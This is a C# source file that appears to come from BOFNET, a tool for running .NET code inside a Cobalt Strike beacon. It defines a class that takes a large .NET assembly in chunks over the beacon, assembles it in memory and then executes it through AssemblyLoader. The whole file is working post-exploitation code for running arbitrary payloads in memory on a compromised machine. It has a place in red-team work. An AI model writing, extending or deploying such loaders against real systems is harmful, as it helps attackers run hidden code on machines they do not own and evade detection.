using BOFNET;
using BOFNET.Bofs;
using System.Collections.Generic;
using System.IO;

namespace BOFNET.Bofs {

    /// <summary>
    /// A twist on AssemblyLoader that supports feeding chunks of assembly data for large binaries (+1MB).  
    /// </summary>
    public class AssemblyLoaderBig : BeaconObject {

        private static Dictionary<string, MemoryStream> activeAssemblyLoads = new Dictionary<string, MemoryStream>();

        BeaconApi api;

        public AssemblyLoaderBig(BeaconApi api) : base(api) {
            this.api = api;
        }

        public override void Go(byte[] chunk) {

            Unpack unpack = new Unpack("Zib", chunk);

            string assemblyName = (string)unpack.Values[0];
            int chunkSize = (int)unpack.Values[1];
            byte[] assemblyChunk = (byte[])unpack.Values[2];
            MemoryStream assemblyData;

            if (!activeAssemblyLoads.ContainsKey(assemblyName)) {
                BeaconConsole.WriteLine($"[+] Setting up new loader with unique id {assemblyName}");
                assemblyData = new MemoryStream();                
                activeAssemblyLoads[assemblyName] = assemblyData;
            } else {                
                assemblyData = activeAssemblyLoads[assemblyName];
            }

            assemblyData.Write(assemblyChunk, 0, assemblyChunk.Length);

            if (assemblyChunk.Length < chunkSize) {   
                new AssemblyLoader(api).Go(assemblyData.ToArray());
                activeAssemblyLoads.Remove(assemblyName);                
            } 
        }
    }
}
